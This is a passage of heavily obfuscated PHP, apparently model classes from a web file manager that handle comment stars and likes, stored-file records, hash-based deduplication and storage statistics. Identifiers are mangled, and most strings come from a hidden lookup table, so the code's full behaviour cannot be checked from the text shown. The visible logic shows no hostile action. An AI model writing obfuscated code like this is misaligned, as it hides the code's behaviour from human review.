$¨‘×Ô­[$õÈº¾˜™[1581]] = $Æƒú¤Ùê; } $ÃúÓÎã£ = $this->field($¡÷•Ø‰Â)->where($¨‘×Ô­)->group($õÈº¾˜™[498])->select(); return array_to_keyvalue($ÃúÓÎã£, $õÈº¾˜™[498], $õÈº¾˜™[494]); } public function starTarget($ „‹ƒå©, $ƒ¸À‚¯Ä) { $»¶ó¤ôÕ =& $_SERVER[¥ÙÌÜ¾ê]; $Ôª­ç¦ğ = $ „‹ƒå© + self::TYPE_STAR_OFFSET; $™ø¯¤ıÛ = array($»¶ó¤ôÕ[1581] => USER_ID, $»¶ó¤ôÕ[406] => $Ôª­ç¦ğ, $»¶ó¤ôÕ[498] => $ƒ¸À‚¯Ä); $ìÔ½ãÇğ = $this->where($™ø¯¤ıÛ)->find(); if ($ìÔ½ãÇğ) { return $this->where(array($»¶ó¤ôÕ[395] => $ìÔ½ãÇğ[$»¶ó¤ôÕ[395]]))->delete(); } $³×ğÑ²¨ = array($»¶ó¤ôÕ[1777] => 0, $»¶ó¤ôÕ[1581] => USER_ID, $»¶ó¤ôÕ[743] => 1, $»¶ó¤ôÕ[748] => $»¶ó¤ôÕ[33], $»¶ó¤ôÕ[406] => $Ôª­ç¦ğ, $»¶ó¤ôÕ[498] => $ƒ¸À‚¯Ä, $»¶ó¤ôÕ[1780] => 0, $»¶ó¤ôÕ[1779] => 0); return $this->add($³×ğÑ²¨); } public function starTargetCount($¬‰£Î‡, $Š“Û®¬¦) { $ ¶ã‹àµ =& $_SERVER[¥ÙÌÜ¾ê]; $Ëîèêü = $Š“Û®¬¦ + self::TYPE_STAR_OFFSET; $ç÷¸É³õ = $this->commentCount($¬‰£Î‡, $Ëîèêü); $ñ¡Õ—È¶ = $this->commentCount($¬‰£Î‡, $Ëîèêü, USER_ID); return array($ ¶ã‹àµ[1782] => $ç÷¸É³õ, $ ¶ã‹àµ[1783] => $ñ¡Õ—È¶); } public function starTargetUserList($ˆ‹Ğ¬ü, $Äë‡Ó»“) { $Èü”¦î =& $_SERVER[¥ÙÌÜ¾ê]; $ç¯çŠùØ = $ˆ‹Ğ¬ü + self::TYPE_STAR_OFFSET; $ç¶‡”† = array($Èü”¦î[498] => $Äë‡Ó»“, $Èü”¦î[406] => $ç¯çŠùØ); $ô…îò¨› = $this->where($ç¶‡”†)->count(); $ñ†Ÿõ‡÷ = array($Èü”¦î[253] => $ô…îò¨›, $Èü”¦î[1784] => array()); if (!$ô…îò¨›) { return $ñ†Ÿõ‡÷; } $¨Š„ÕÒÓ = $this->field($Èü”¦î[1581])->where($ç¶‡”†)->limit(500)->select(); $¨Š„ÕÒÓ = array_to_keyvalue($¨Š„ÕÒÓ, $Èü”¦î[33], $Èü”¦î[1581]); $ñ†Ÿõ‡÷[$Èü”¦î[1784]] = Model($Èü”¦î[507])->userListInfo($¨Š„ÕÒÓ); return $ñ†Ÿõ‡÷; } public function prasiseUserList($­½ñ·) { $èîşÒ¢¼ =& $_SERVER[¥ÙÌÜ¾ê]; $ÑÁ¢ÜÔ® = array($èîşÒ¢¼[1785] => $­½ñ·); $ú—ÁøÔÓ = $this->where($ÑÁ¢ÜÔ®)->find(); $û³¨í = _get($ú—ÁøÔÓ, $èîşÒ¢¼[1780], 0); $Ïã¬š…¡ = array($èîşÒ¢¼[253] => $û³¨í, $èîşÒ¢¼[1784] => array()); if (!$û³¨í) { return $Ïã¬š…¡; } $ĞÚêë  = Model($èîşÒ¢¼[1786])->field($èîşÒ¢¼[1581])->where($ÑÁ¢ÜÔ®)->limit(500)->select(); $ĞÚêë  = array_to_keyvalue($ĞÚêë , $èîşÒ¢¼[33], $èîşÒ¢¼[1581]); $Ïã¬š…¡[$èîşÒ¢¼[1784]] = Model($èîşÒ¢¼[507])->userListInfo($ĞÚêë ); return $Ïã¬š…¡; } public function remove($–Ã“€õ¾) { $ÔÆ£œ½‚ =& $_SERVER[¥ÙÌÜ¾ê]; $¬ÒÒª©Í = array($ÔÆ£œ½‚[1778] => $–Ã“€õ¾); $­ˆ¢Û¿ı = $this->where($¬ÒÒª©Í)->find(); if ($­ˆ¢Û¿ı[$ÔÆ£œ½‚[1777]]) { $this->where(array($ÔÆ£œ½‚[1778] => $­ˆ¢Û¿ı[$ÔÆ£œ½‚[1777]]))->setAdd($ÔÆ£œ½‚[1779], -1); } return $this->where($¬ÒÒª©Í)->delete(); } public function edit($¢Óø¾İš, $İä­ÕÚ²) { $Ÿ£¨”ÆÚ =& $_SERVER[¥ÙÌÜ¾ê]; $èÁÜñ¿‚ = array($Ÿ£¨”ÆÚ[1778] => $¢Óø¾İš); return $this->where($èÁÜñ¿‚)->save(array($Ÿ£¨”ÆÚ[1787] => $İä­ÕÚ²)); } public function prasise($‰™™­¾Ê) { $Úš¬—Ü¾ =& $_SERVER[¥ÙÌÜ¾ê]; $ñê¥’Šº = Model($Úš¬—Ü¾[1788]); $ˆÚä²ò¼ = array($Úš¬—Ü¾[1778] => $‰™™­¾Ê, $Úš¬—Ü¾[1572] => USER_ID); $Ï¸ä˜¬ã = $ñê¥’Šº->where($ˆÚä²ò¼)->find(); if (!$Ï¸ä˜¬ã) { $ñê¥’Šº->add($ˆÚä²ò¼); $ë¬ãã¬› = $this->where(array($Úš¬—Ü¾[1778] => $‰™™­¾Ê))->setAdd($Úš¬—Ü¾[1780], 1); } else { $ñê¥’Šº->where($ˆÚä²ò¼)->delete(); $ë¬ãã¬› = $this->where(array($Úš¬—Ü¾[1778] => $‰™™­¾Ê))->setAdd($Úš¬—Ü¾[1780], -1); } return $ë¬ãã¬›; } public function targetInfo($Èà²—Š, $âÙîËí¶) { $‡»ó¨¸Ù =& $_SERVER[¥ÙÌÜ¾ê]; $Ôö˜¦ı± = array($‡»ó¨¸Ù[574] => $Èà²—Š, $‡»ó¨¸Ù[575] => $âÙîËí¶); $ßÂÙ¶ = $this->where($Ôö˜¦ı±)->count(); $©´§şÑ¾ = "\x52\111\107\x48\x54\x20\112\x4f\111\x4e\40{$this->tablePrefix}\143\x6f\x6d\x6d\145\x6e\164\137\x70\162\141\x69\x73\145\40\163\x74\x61\x72\x20\157\x6e\40\x63\x6f\155\x6d\145\156\164\56\143\157\x6d\155\145\156\164\x49\x44\40\x3d\40\163\x74\x61\162\56\x63\157\155\155\x65\156\x74\111\x44"; $“–êƒË¸ = $this->alias($‡»ó¨¸Ù[352])->where($Ôö˜¦ı±)->join($©´§şÑ¾, $‡»ó¨¸Ù[1789])->count(); $µ‚ìŸÊ = array($‡»ó¨¸Ù[1790] => $ßÂÙ¶, $‡»ó¨¸Ù[1791] => $“–êƒË¸); return $µ‚ìŸÊ; } public function listData($¯şËêàä) { $ĞÁØ½Õ¤ =& $_SERVER[¥ÙÌÜ¾ê]; if (isset($¯şËêàä[$ĞÁØ½Õ¤[1792]])) { if ($¯şËêàä[$ĞÁØ½Õ¤[1792]]) { $¯şËêàä[$ĞÁØ½Õ¤[1785]] = array($ĞÁØ½Õ¤[1010], intval($¯şËêàä[$ĞÁØ½Õ¤[1792]])); } unset($¯şËêàä[$ĞÁØ½Õ¤[1792]]); } if (isset($¯şËêàä[$ĞÁØ½Õ¤[1793]])) { if ($¯şËêàä[$ĞÁØ½Õ¤[1793]]) { $¯şËêàä[$ĞÁØ½Õ¤[1785]] = array($ĞÁØ½Õ¤[1007], intval($¯şËêàä[$ĞÁØ½Õ¤[1793]])); } unset($¯şËêàä[$ĞÁØ½Õ¤[1793]]); } return $this->_listData($¯şËêàä); } private function _listData($æÉ¯§¥) { $×Ì¾áŸå =& $_SERVER[¥ÙÌÜ¾ê]; $Úı³¡øì = $this->where($æÉ¯§¥)->_makeOrder()->selectPage(100); $this->_listAppendParent($Úı³¡øì[$×Ì¾áŸå[367]]); $this->_listAppendUser($Úı³¡øì[$×Ì¾áŸå[367]]); $this->_listAppendMeta($Úı³¡øì[$×Ì¾áŸå[367]]); return $Úı³¡øì; } private function _makeOrder() { $Ï¡†ÓêÀ =& $_SERVER[¥ÙÌÜ¾ê]; $Ìá£ÆØô = array($Ï¡†ÓêÀ[1780], $Ï¡†ÓêÀ[1779], $Ï¡†ÓêÀ[194]); $Õáü«Â÷ = Input::get($Ï¡†ÓêÀ[449], $Ï¡†ÓêÀ[7], $Ï¡†ÓêÀ[418], $Ìá£ÆØô); $·éİ¼¢è = Input::get($Ï¡†ÓêÀ[450], $Ï¡†ÓêÀ[7], $Ï¡†ÓêÀ[1574], array($Ï¡†ÓêÀ[1794], $Ï¡†ÓêÀ[445])); $áè€ÑŸ = $Õáü«Â÷ . $Ï¡†ÓêÀ[50] . $·éİ¼¢è; return $this->order($áè€ÑŸ); } private function _listAppendParent(&$àâ Ï«) { $¤¸ñ™åÓ =& $_SERVER[¥ÙÌÜ¾ê]; $’®çöôæ = array_unique(array_to_keyvalue($àâ Ï«, $¤¸ñ™åÓ[33], $¤¸ñ™åÓ[1777])); $’®çöôæ = array_remove_value($’®çöôæ, $¤¸ñ™åÓ[191]); if (!$’®çöôæ) { return; } $Ğ–í§ = $this->where(array($¤¸ñ™åÓ[1778] => array($¤¸ñ™åÓ[7], $’®çöôæ)))->select(); $Ğ–í§ = array_to_keyvalue($Ğ–í§, $¤¸ñ™åÓ[1785]); foreach ($àâ Ï« as &$µ¨æƒÑœ) { if (isset($Ğ–í§[$µ¨æƒÑœ[$¤¸ñ™åÓ[1777]]])) { $µ¨æƒÑœ[$¤¸ñ™åÓ[1795]] = $Ğ–í§[$µ¨æƒÑœ[$¤¸ñ™åÓ[1777]]]; } } unset($µ¨æƒÑœ); } private function _listAppendUser(&$¼šûœª²) { $• üçÂ¤ =& $_SERVER[¥ÙÌÜ¾ê]; $à³îâş = array_unique(array_to_keyvalue($¼šûœª², $• üçÂ¤[33], $• üçÂ¤[1581])); $à³îâş = array_remove_value($à³îâş, $• üçÂ¤[191]); if (count($à³îâş) == 0) { return; } foreach ($¼šûœª² as $´—º“Ò) { if (isset($´—º“Ò[$• üçÂ¤[1795]])) { $à³îâş[] = $´—º“Ò[$• üçÂ¤[1795]][$• üçÂ¤[1581]]; } } $Æ³ó†š¼ = Model($• üçÂ¤[532])->userListInfo($à³îâş); foreach ($¼šûœª² as &$´—º“Ò) { $´—º“Ò[$• üçÂ¤[588]] = $Æ³ó†š¼[$´—º“Ò[$• üçÂ¤[1581]]]; if (isset($´—º“Ò[$• üçÂ¤[1795]])) { $´—º“Ò[$• üçÂ¤[1795]][$• üçÂ¤[588]] = $Æ³ó†š¼[$´—º“Ò[$• üçÂ¤[1795]][$• üçÂ¤[1581]]]; } } unset($´—º“Ò); } private function _listAppendMeta(&$÷İÜ¼œ) { $¤¢šö” =& $_SERVER[¥ÙÌÜ¾ê]; $Îì—¬úØ = array_unique(array_to_keyvalue($÷İÜ¼œ, $¤¢šö”[33], $¤¢šö”[1785])); $Îì—¬úØ = array_remove_value($Îì—¬úØ, $¤¢šö”[191]); if (!$Îì—¬úØ) { return; } foreach ($÷İÜ¼œ as $ŸÈ£¼àÒ) { if (isset($ŸÈ£¼àÒ[$¤¢šö”[1795]])) { $Îì—¬úØ[] = $ŸÈ£¼àÒ[$¤¢šö”[1795]][$¤¢šö”[1785]]; } } $àë£Óà = $this->metaList($Îì—¬úØ); if (!$àë£Óà) { return !1; } foreach ($÷İÜ¼œ as &$ŸÈ£¼àÒ) { $ŸÈ£¼àÒ[$¤¢šö”[459]] = $àë£Óà[$ŸÈ£¼àÒ[$¤¢šö”[1785]]]; if (isset($ŸÈ£¼àÒ[$¤¢šö”[1795]])) { $ŸÈ£¼àÒ[$¤¢šö”[1795]][$¤¢šö”[459]] = $àë£Óà[$ŸÈ£¼àÒ[$¤¢šö”[1795]][$¤¢šö”[1785]]]; } } unset($ŸÈ£¼àÒ); } private function metaList($×·ó”Óõ) { $‚‚×Äõ® =& $_SERVER[¥ÙÌÜ¾ê]; if (!$×·ó”Óõ) { return array(); } $û´Úê¦£ = array($‚‚×Äõ®[1785] => array($‚‚×Äõ®[7], $×·ó”Óõ)); $´óõà…Ã = Model($‚‚×Äõ®[1796])->where($û´Úê¦£)->select(); $´óõà…Ã = array_to_keyvalue_group($´óõà…Ã, $‚‚×Äõ®[1785]); foreach ($´óõà…Ã as $ûª˜Ñ´ => $ßë½èÁ±) { $Ğ×‰œ– = array(); foreach ($ßë½èÁ± as $Ò×³ÚŠ) { $Ğ×‰œ–[$Ò×³ÚŠ[$‚‚×Äõ®[93]]] = $Ò×³ÚŠ[$‚‚×Äõ®[372]]; } $´óõà…Ã[$ûª˜Ñ´] = $Ğ×‰œ–; } return $´óõà…Ã ? $´óõà…Ã : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\151\154\x65\137\x63\x6f\x6e\x74\x65\x6e\164\x73"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\145\x54\151\155\145", "\164\151\x6d\x65", "\151\156\163\x65\x72\x74", "\146\x75\x6e\143\x74\x69\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\157\137\146\151\x6c\x65"; protected $tableMeta = array("\x74\x61\x62\154\145\116\141\x6d\x65" => "\151\x6f\x5f\x66\x69\154\x65\x5f\x6d\145\164\x61", "\x6d\x65\x74\x61\106\x69\x65\154\144" => "\146\x69\154\145\111\x44"); public function fileInfo($Ë’°ëÌ) { $à¥± =& $_SERVER[¥ÙÌÜ¾ê]; static $š”Ùı¼ = array(); if (!isset($š”Ùı¼[$Ë’°ëÌ])) { $¿ó±·Ç = $à¥±[1797]; $œåÙ……Ì = Model($à¥±[464])->field($¿ó±·Ç)->where(array($à¥±[462] => $Ë’°ëÌ))->find(); $š”Ùı¼[$Ë’°ëÌ] = $œåÙ……Ì; } return $š”Ùı¼[$Ë’°ëÌ]; } public function addFileByContent($Û˜³²÷µ = '', $¡ßÄ¬ÒÚ = '') { $´Ä†ï„† =& $_SERVER[¥ÙÌÜ¾ê]; $ÚÉ‰Êş¶ = TEMP_PATH . $´Ä†ï„†[1798]; if (!is_dir($ÚÉ‰Êş¶)) { mk_dir($ÚÉ‰Êş¶); } $×Ô”­òƒ = $ÚÉ‰Êş¶ . $´Ä†ï„†[1799] . rand_string(16); file_put_contents($×Ô”­òƒ, $Û˜³²÷µ); $ÌÜüË” = $this->addFile($×Ô”­òƒ, $¡ßÄ¬ÒÚ, !0); if (file_exists($×Ô”­òƒ)) { @unlink($×Ô”­òƒ); } return $ÌÜüË”; } public function createFileName($µˆÓ€ù, $çƒ­óò = false, $„Âû‚–¹ = false) { $¨•Î¹–ƒ =& $_SERVER[¥ÙÌÜ¾ê]; $æğÌ¾şÅ = IO::init($¨•Î¹–ƒ[8]); $Æ¶§â›İ = $this->makeFilePath($µˆÓ€ù, $æğÌ¾şÅ, $çƒ­óò, $„Âû‚–¹); $ş’âË¨ = $æğÌ¾şÅ->pathFather($Æ¶§â›İ); static $Ú¬„ò³£ = false; $œÓ¯îõ¯ = $¨•Î¹–ƒ[1800] . md5($ş’âË¨); if (!$Ú¬„ò³£ && !Cache::get($œÓ¯îõ¯)) { $Ú¬„ò³£ = !0; $«—†‰´· = IO::mkdir($ş’âË¨); if (!IO::exist($«—†‰´· . $¨•Î¹–ƒ[796])) { IO::mkfile($«—†‰´· . $¨•Î¹–ƒ[796]); } Cache::set($œÓ¯îõ¯, 1, 3600 * 2); } return $Æ¶§â›İ; } public function makeFilePath($’Ã€®Ú×, $ı¢è¦è, $¢Àê‹òÏ = false, $ò¿â•ñ = false) { $é¶Û‰¼¡ =& $_SERVER[¥ÙÌÜ¾ê]; $–Ô¸†ã˜ = Model($é¶Û‰¼¡[763])->get($é¶Û‰¼¡[1801]); $ì©İ İ© = KodIO::defaultIO() . date($é¶Û‰¼¡[1802]); $¢’±Ú = $ì©İ İ© . rand_string(5) . short_id(100); $’Ã€®Ú× = str_replace($é¶Û‰¼¡[8], $é¶Û‰¼¡[71], KodIO::clear($’Ã€®Ú×)); $ºŞ¾‰®ô = $ı¢è¦è->ext($’Ã€®Ú×); if (!$’Ã€®Ú×) { $–Ô¸†ã˜ = $é¶Û‰¼¡[1803]; } switch ($–Ô¸†ã˜) { case $é¶Û‰¼¡[1804]: $¢’±Ú = $¢’±Ú . $é¶Û‰¼¡[95] . $ı¢è¦è->ext($’Ã€®Ú×); if ($ºŞ¾‰®ô == $é¶Û‰¼¡[1741]) { $¢’±Ú .= $é¶Û‰¼¡[1477]; } break; case $é¶Û‰¼¡[1805]: $×»ïµŠÙ = Model($é¶Û‰¼¡[763])->get($é¶Û‰¼¡[764]); $ßìØ„›‘ = substr(md5($é¶Û‰¼¡[765] . $×»ïµŠÙ . date($é¶Û‰¼¡[741])), 0, 8); $¯áòµÅ† = KodIO::defaultDriver(); $ì©İ İ© = $é¶Û‰¼¡[1159] . $¯áòµÅ†[$é¶Û‰¼¡[395]] . $é¶Û‰¼¡[404] . date($é¶Û‰¼¡[1806]) . $ßìØ„›‘ . $é¶Û‰¼¡[8]; if ($ºŞ¾‰®ô == $é¶Û‰¼¡[1741]) { $’Ã€®Ú× .= $é¶Û‰¼¡[1477]; } $¾²øÆ = $é¶Û‰¼¡[1807] . $ì©İ İ© . $’Ã€®Ú×; CacheLock::lock($¾²øÆ); $¢’±Ú = $ì©İ İ© . $’Ã€®Ú×; if (IO::exist($ì©İ İ© . $’Ã€®Ú×)) { $ŠÔ•©² = substr($’Ã€®Ú×, 0, strlen($’Ã€®Ú×) - strlen($ºŞ¾‰®ô)); $ïÄÔì” = $ò¿â•ñ ? substr($ò¿â•ñ, 0, 5) : ($¢Àê‹òÏ ? substr($¢Àê‹òÏ, 0, 5) : rand_string(5)); $¢’±Ú = $ì©İ İ© . $ŠÔ•©² . $ïÄÔì” . $é¶Û‰¼¡[95] . $ºŞ¾‰®ô; } if (IO::isTypeObject($¢’±Ú) && !IO::isUploadServer($¢’±Ú)) { if (IO::exist($¢’±Ú)) { return $¢’±Ú; } $”À£Ÿªê = IO::setContent($¢’±Ú, $é¶Û‰¼¡[33]); if (!$”À£Ÿªê) { show_json($é¶Û‰¼¡[1808], !1); } } CacheLock::unlock($¾²øÆ); break; case $é¶Û‰¼¡[1803]: break; default: break; } return $¢’±Ú; } public function addFileByRemote($÷Ş÷™Ì, $—Ÿ¹È´ı, $ŠÏ°òşà = array()) { $Ò°ŞÙñ× =& $_SERVER[¥ÙÌÜ¾ê]; if (!IO::exist($÷Ş÷™Ì)) { return !1; } $´‡Çöì = $ŠÏ°òşà[$Ò°ŞÙñ×[170]] ? $ŠÏ°òşà[$Ò°ŞÙñ×[170]] : $Ò°ŞÙñ×[33]; $ªÓ¨¸Œè = IO::hashMd5($÷Ş÷™Ì, $´‡Çöì); $Ø£÷á¯Ş = KodIO::defaultDriver(); $ÉË¾³« = array($Ò°ŞÙñ×[573] => IO::size($÷Ş÷™Ì), $Ò°ŞÙñ×[1809] => 1, $Ò°ŞÙñ×[415] => $—Ÿ¹È´ı, $Ò°ŞÙñ×[808] => $Ø£÷á¯Ş[$Ò°ŞÙñ×[395]], $Ò°ŞÙñ×[416] => $÷Ş÷™Ì, $Ò°ŞÙñ×[1810] => $ŠÏ°òşà[$Ò°ŞÙñ×[171]] ? $ŠÏ°òşà[$Ò°ŞÙñ×[171]] : IO::hashSimple($÷Ş÷™Ì), $Ò°ŞÙñ×[1811] => $ªÓ¨¸Œè ? $ªÓ¨¸Œè : $´‡Çöì); if ($ªŞÑÒç› = $this->addFileCheckExist($ÉË¾³«[$Ò°ŞÙñ×[171]], $ÉË¾³«[$Ò°ŞÙñ×[170]], $ÉË¾³«[$Ò°ŞÙñ×[78]])) { return $ªŞÑÒç›; } return $this->addFileData($ÉË¾³«); } private function addFileData($ìò¼ŸÅÄ) { $ğù‹«¥£ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$ìò¼ŸÅÄ) { return !1; } $ìò¼ŸÅÄ[$ğù‹«¥£[78]] = intval($ìò¼ŸÅÄ[$ğù‹«¥£[78]]); if (!$ìò¼ŸÅÄ[$ğù‹«¥£[78]] && strlen($ìò¼ŸÅÄ[$ğù‹«¥£[171]]) > 32) { $ìò¼ŸÅÄ[$ğù‹«¥£[78]] = intval(substr($ìò¼ŸÅÄ[$ğù‹«¥£[171]], 32)); } $À«ÆœÕ = $this->add($ìò¼ŸÅÄ); return $this->find($À«ÆœÕ); } public function addFile($ãò­¢–†, $²¶ğÖÀş, $õ…¸Ê¡ = false) { $ÒŒ®ÖÀş =& $_SERVER[¥ÙÌÜ¾ê]; $¢á€Âæ = IO::hashSimple($ãò­¢–†); $Œ·Âáß· = IO::size($ãò­¢–†); $—²®§Ñä = $Œ·Âáß· <= 1024 * 1024 * 10 ? IO::hashMd5($ãò­¢–†) : $ÒŒ®ÖÀş[33]; $ô¶¥¯¾ì = $ÒŒ®ÖÀş[1812] . $¢á€Âæ; CacheLock::lock($ô¶¥¯¾ì); if ($—²®§Ñä && $¢á€Âæ) { $Éğ´Áµ™ = $this->addFileCheckExist($¢á€Âæ, $—²®§Ñä, $Œ·Âáß·); if ($Éğ´Áµ™) { CacheLock::unlock($ô¶¥¯¾ì); return $Éğ´Áµ™; } } $ËÑõ¯Ü = $this->addFileMake($ãò­¢–†, $Œ·Âáß·, $¢á€Âæ, $—²®§Ñä, $²¶ğÖÀş, $õ…¸Ê¡); $ŒÆÙàíú = $this->addFileData($ËÑõ¯Ü); CacheLock::unlock($ô¶¥¯¾ì); if (!$—²®§Ñä && $ŒÆÙàíú) { $this->fileMd5Check($ŒÆÙàíú); } return $ŒÆÙàíú; } private function fileMd5Check($©‡¬‘€Ş) { $ šğ©ñ =& $_SERVER[¥ÙÌÜ¾ê]; $¢ª›ø¬™ = array($©‡¬‘€Ş[$ šğ©ñ[461]], $©‡¬‘€Ş[$ šğ©ñ[76]]); $´µ˜ïİİ = $ šğ©ñ[1813] . $©‡¬‘€Ş[$ šğ©ñ[76]]; $…ŠüĞú§ = $ šğ©ñ[1814] . $©‡¬‘€Ş[$ šğ©ñ[461]]; $ìá”ü¡” = TaskQueue::add($ šğ©ñ[1815], $¢ª›ø¬™, $´µ˜ïİİ, $…ŠüĞú§); if (!$ìá”ü¡”) { $this->fileMd5Set($©‡¬‘€Ş[$ šğ©ñ[461]], $©‡¬‘€Ş[$ šğ©ñ[76]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($â‹×’šà, $éÕÙØÕ) { $´µºÒü¤ =& $_SERVER[¥ÙÌÜ¾ê]; $´©«Ó“¨ = $this->find($â‹×’šà); if (!$´©«Ó“¨ || $´©«Ó“¨[$´µºÒü¤[170]]) { return; } $‡ëø ­¤ = IO::hashMd5($éÕÙØÕ); if (!$‡ëø ­¤) { return $´µºÒü¤[33]; } $this->where(array($´µºÒü¤[461] => $â‹×’šà))->save(array($´µºÒü¤[170] => $‡ëø ­¤)); } public function addFileMake($ÁÆüİ•ï, $¨§àÉ¬, $²Â¹×€, $ıœ”ƒâ, $“ö™­‘ë, $Ìö©·) { $†¤ƒ†Üõ =& $_SERVER[¥ÙÌÜ¾ê]; $¾áãñ˜Â = $this->createFileName($“ö™­‘ë, $²Â¹×€, $ıœ”ƒâ); $ÂƒÀµÇ˜ = get_path_father($¾áãñ˜Â); $ºôÍÌöÖ = get_path_this($¾áãñ˜Â); if ($Ìö©·) { $ÂµçªüÎ = IO::move($ÁÆüİ•ï, $ÂƒÀµÇ˜, !1, $ºôÍÌöÖ); } else { $ÂµçªüÎ = IO::copy($ÁÆüİ•ï, $ÂƒÀµÇ˜, !1, $ºôÍÌöÖ); } if (!$ÂµçªüÎ) { return !1; } $É¯¼ôœÑ = KodIO::defaultDriver(); $õŠŠÄ‹ = array($†¤ƒ†Üõ[573] => $¨§àÉ¬, $†¤ƒ†Üõ[1809] => 1, $†¤ƒ†Üõ[415] => $“ö™­‘ë, $†¤ƒ†Üõ[808] => $É¯¼ôœÑ[$†¤ƒ†Üõ[395]], $†¤ƒ†Üõ[416] => $¾áãñ˜Â, $†¤ƒ†Üõ[1810] => $²Â¹×€, $†¤ƒ†Üõ[1811] => $ıœ”ƒâ); return $õŠŠÄ‹; } public function addFileCheckExist($ºŞó§íö, $û¦Â²®ø, $´«Åö•Š) { $èÉÍ èÓ =& $_SERVER[¥ÙÌÜ¾ê]; $Ø–…Í” = $this->findByHash($ºŞó§íö, $û¦Â²®ø); if (!$Ø–…Í”) { return !1; } $‘—°Õºí = array($èÉÍ èÓ[1809] => intval($Ø–…Í”[$èÉÍ èÓ[1816]]) + 1, $èÉÍ èÓ[573] => $´«Åö•Š); $this->where(array($èÉÍ èÓ[462] => $Ø–…Í”[$èÉÍ èÓ[461]]))->save($‘—°Õºí); return $Ø–…Í”; } public function remove($à€¡¹áˆ) { $this->linkCountChange($à€¡¹áˆ, !1); $this->clearEmpty(); return !0; } public function linkAdd($äËÕ½ñÃ) { $this->linkCountChange($äËÕ½ñÃ, !0); } public function linkCountChange($í‰úé½ú, $÷Î½ü÷) { $ô¢ø¨€ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$í‰úé½ú) { return; } if (!is_array($í‰úé½ú)) { $í‰úé½ú = array($í‰úé½ú); } $©ÎéÎŸ = array(); foreach ($í‰úé½ú as $Â¸×¬÷‡) { $Û Òœ€ = $Â¸×¬÷‡ . $ô¢ø¨€[33]; if (!$©ÎéÎŸ[$Û Òœ€]) { $©ÎéÎŸ[$Û Òœ€] = 0; } $©ÎéÎŸ[$Û Òœ€]++; } $¦†àÎÓÆ = array(); foreach ($©ÎéÎŸ as $Â¸×¬÷‡ => $çŠìç›) { $Û Òœ€ = $çŠìç› . $ô¢ø¨€[33]; if (!$¦†àÎÓÆ[$Û Òœ€]) { $¦†àÎÓÆ[$Û Òœ€] = array(); } $¦†àÎÓÆ[$Û Òœ€][] = $Â¸×¬÷‡; } foreach ($¦†àÎÓÆ as $çŠìç› => $ìâù³É) { if (!$ìâù³É) { continue; } $çŠìç› = $÷Î½ü÷ ? $çŠìç› : -intval($çŠìç›); $Á¡¡ÃÒ³ = array($ô¢ø¨€[461] => array($ô¢ø¨€[7], $ìâù³É)); if ($çŠìç› < 0) { $Á¡¡ÃÒ³[$ô¢ø¨€[1816]] = array($ô¢ø¨€[1011], abs($çŠìç›)); } $this->where($Á¡¡ÃÒ³)->setAdd($ô¢ø¨€[1816], $çŠìç›); } } public function findByHash($íâ»Óœ, $Ôå£ËØö = false) { $¸é½ş†— =& $_SERVER[¥ÙÌÜ¾ê]; if (!$íâ»Óœ && !$Ôå£ËØö) { return !1; } $ıŞ½œâı = array($¸é½ş†—[1810] => $íâ»Óœ); if ($Ôå£ËØö) { $ıŞ½œâı = array($¸é½ş†—[1811] => $Ôå£ËØö); } return $this->order($¸é½ş†—[1817])->where($ıŞ½œâı)->find(); } public function clearEmpty($ıÑËä…å = 0) { $í‹‰ùº² =& $_SERVER[¥ÙÌÜ¾ê]; $óĞ¸½ÄØ = time() - 3600 * 24 * $ıÑËä…å; $äÍØ¨ = $í‹‰ùº²[1818] . $óĞ¸½ÄØ; $Ë²¬»º = $this->where($äÍØ¨)->select(); if (!$Ë²¬»º) { return; } $ˆ™ƒª­š = new Task($í‹‰ùº²[1819], $í‹‰ùº²[33], count($Ë²¬»º)); foreach ($Ë²¬»º as $İ“…ûØç) { $ˆ™ƒª­š->update(1); $this->resetFile($İ“…ûØç); } $ˆ™ƒª­š->end(); } public function resetFile($Ùóí„‘›) { $¬ˆ‹Ñä‡ =& $_SERVER[¥ÙÌÜ¾ê]; $´Î·Ì—ì = array($¬ˆ‹Ñä‡[462] => $Ùóí„‘›[$¬ˆ‹Ñä‡[461]]); $ÔÏ·¼Šô = Model($¬ˆ‹Ñä‡[1253])->where($´Î·Ì—ì)->count(); $ìœ–ã÷û = Model($¬ˆ‹Ñä‡[1820])->where($´Î·Ì—ì)->count(); $ØÔÄÏóİ = intval($ÔÏ·¼Šô) + intval($ìœ–ã÷û); if ($ØÔÄÏóİ == 0) { IO::remove($Ùóí„‘›[$¬ˆ‹Ñä‡[76]]); Model($¬ˆ‹Ñä‡[1821])->delete($Ùóí„‘›[$¬ˆ‹Ñä‡[461]]); $this->where($´Î·Ì—ì)->delete(); $this->metaSet($Ùóí„‘›[$¬ˆ‹Ñä‡[461]], null, null); return; } if ($Ùóí„‘›[$¬ˆ‹Ñä‡[1816]] != $ØÔÄÏóİ) { $this->where($´Î·Ì—ì)->save(array($¬ˆ‹Ñä‡[1809] => $ØÔÄÏóİ)); } } public function storageInfo($’¶Áì£ü = false) { $ïÓ—œ“ =& $_SERVER[¥ÙÌÜ¾ê]; $ŠóŠë = $this->count() + 0.0; $¢‹ŞÊ®¸ = 0; $Ñõè‡É« = 1; $¸ïİó÷Û = 0; $È˜¨ëü¤ = 5000; for ($ïõßãÍ = 0; $ïõßãÍ < $ŠóŠë; $ïõßãÍ = $ïõßãÍ + $È˜¨ëü¤) { $éóøË½ğ = $this->limit($ïõßãÍ, $ïõßãÍ + $È˜¨ëü¤)->select(); foreach ($éóøË½ğ as $‰Ü¿») { $Ñõè‡É« += $‰Ü¿»[$ïÓ—œ“[78]] * $‰Ü¿»[$ïÓ—œ“[1816]]; $¢‹ŞÊ®¸ += $‰Ü¿»[$ïÓ—œ“[78]] * ($‰Ü¿»[$ïÓ—œ“[1816]] - 1); $¸ïİó÷Û += $‰Ü¿»[$ïÓ—œ“[1816]]; } } $Ã‰°öªÃ = array($ïÓ—œ“[1822] => $Ñõè‡É«, $ïÓ—œ“[1823] => $¢‹ŞÊ®¸, $ïÓ—œ“[1824] => $¢‹ŞÊ®¸ / $Ñõè‡É«, $ïÓ—œ“[82] => $ŠóŠë, $ïÓ—œ“[1825] => $¸ïİó÷Û); return $Ã‰°öªÃ; } } goto b˜›ˆ¸—¡; 